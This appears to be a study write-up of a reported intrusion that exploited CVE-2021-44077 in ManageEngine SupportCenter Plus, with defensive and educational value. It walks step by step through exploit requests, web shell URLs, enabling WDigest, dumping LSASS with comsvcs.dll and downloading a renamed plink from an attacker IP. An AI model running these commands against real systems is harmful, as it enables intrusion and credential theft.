# Attack Roadmap

### [Will the Real Msiexec Please Stand Up? Exploit Leads to Data Exfiltration](https://thedfirreport.com/2022/06/06/will-the-real-msiexec-please-stand-up-exploit-leads-to-data-exfiltration/)
#### Incident Summary

<p align="center">
<img src="AttackRoadmap.png"  width="20%" height="20%" align="center">
</p>

## Let's Summarize Each Step

#### 1. Exploit [CVE-2021-44077](https://nvd.nist.gov/vuln/detail/CVE-2021-44077) in in `ManageEngine SupportCenter Plus`. The exploit looks very similar to a publicly available POC exploit on [GitHub](https://github.com/horizon3ai/CVE-2021-44077).

##### Exploit Method: RCE via two HTTP requests.
 - Request 1: POST request to /RestAPI/ImportTechnicians?step=1 contains `msiexec.exe` and was written to C:\Program Files\ManageEngine\SupportCenterPlus\bin\msiexec.exe.

 - Request 2: GET request to /RestAPI/s247action?execute=s247AgentInstallationProcess&apikey=asdasd, and invoke the uploaded `msiexec.exe`.

  ![image](https://github.com/user-attachments/assets/ce028655-d691-4c2d-86e3-370d9ce76742)

#### 2. Web Shell Deployment:
- The Malicous msiexec.exe contains encoded web shell once `msiexec.exe /i Site24x7WindowsAgent.msi EDITA1=asdasd /qn` there is a webshell file `jm2.jsp` written to `C:\Program Files\ManageEngine\SupportCenterPlus\custom\login\fm2.jsp`, this way will allow the threat actor to maintain the access with no need to execute the exploit once again.
- Now you have an access to the system through `http://<victim_ip:8080/custom/login/jm2.jsp` then you can `Execute Commands` and `View and Download files`
  
  ![image](https://github.com/user-attachments/assets/65b4b314-1bf1-44cb-b281-8c5fa18156ac)

#### 3. System Enumeration
- Then basic enumuration is made.
  ```
  https://server.example/custom/login/fm2.jsp?cmd=arp -a
  https://server.example/custom/login/fm2.jsp?cmd=systeminfo
  https://server.example/custom/login/fm2.jsp?cmd=tasklist
  https://server.example/custom/login/fm2.jsp?cmd=wmic computersystem get domain
  ```
#### 4. Credential Dumping
- The Threat Actor Checked if the `WDigest` is Enabled because When WDigest is Enabled `LSASS` stores passwords in Plaintext.
- Check WDigest:
  ```
   powershell.exe reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
  ```
- Enable WDigest:
  ```
  powershell.exe  Set-ItemProperty -Force -Path  'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name  'UseLogonCredential' -Value '1'
  ```
 - Stealing Credentials (Dumping LSASS):
   ```
   C:\windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll MiniDump [LSASS_PROC_ID] C:\windows\temp\logctl.zip full
   ``` 

 #### 5. Lateral Movement
 - Threat Actor Downloaded file.exe and wrote it to ekern.exe and this file was realy a renamed `plink.exe`
 - `plink.exe`: A command-line SSH client
   ```
   powershell.exe (New-Object System.Net.WebClient).DownloadFile('hXXp://23.81.246[.]84/file.exe', 'c:\windows\temp\ekern.exe')
   ```
   <p align="center">
   <img src='https://private-user-images.githubusercontent.com/84778438/349634641-85dc8953-0f11-4624-85cc-49dd3170e433.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MjEyNDE5MjgsIm5iZiI6MTcyMTI0MTYyOCwicGF0aCI6Ii84NDc3ODQzOC8zNDk2MzQ2NDEtODVkYzg5NTMtMGYxMS00NjI0LTg1Y2MtNDlkZDMxNzBlNDMzLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNDA3MTclMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjQwNzE3VDE4NDAyOFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTNhNTY5ZWZmMzAyNTc4MjJmMTIwZDI3ZTA0ZTA2N2QxOWM4ZDdiM2NiMDk4ZmU3ZTM1NWFjYTFlMmY4ZGIzOTcmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JmFjdG9yX2lkPTAma2V5X2lkPTAmcmVwb19pZD0wIn0.B5SLSXUMS02tabQq-nibls930lQk0adRYWGfHGKZOEc' width="30%" height="30%" align="center">
 <p>
 
 - `Plink` was used in conjunction with a batch script `FXS.bat` to establish an SSH connection with the threat actor’s server on port `443` instead of `22`.
 - Proxied RDP Traffic: used SSH tunnel to RDP to the beachhead server.
 
 #### 6. Data Exfiltration
 - The Threat Actor Downloaded some Sensitive files like `postgres DB backup` of the ManageEngine SupportCenter Plus application using the web shell.
   
  ![Untitled3.png](Untitled3.png)

 - then he downloaded a certificate from the server, a Visio file, and an excel sheet for the accounts via web shell
 #### 7. Defense Evasion
 -  After Exfiltrating the LSASS dump file `logctl.zip`, the attacker deleted the dump file to hide their traces.

   ![Del-logctzip](12993-11.png)

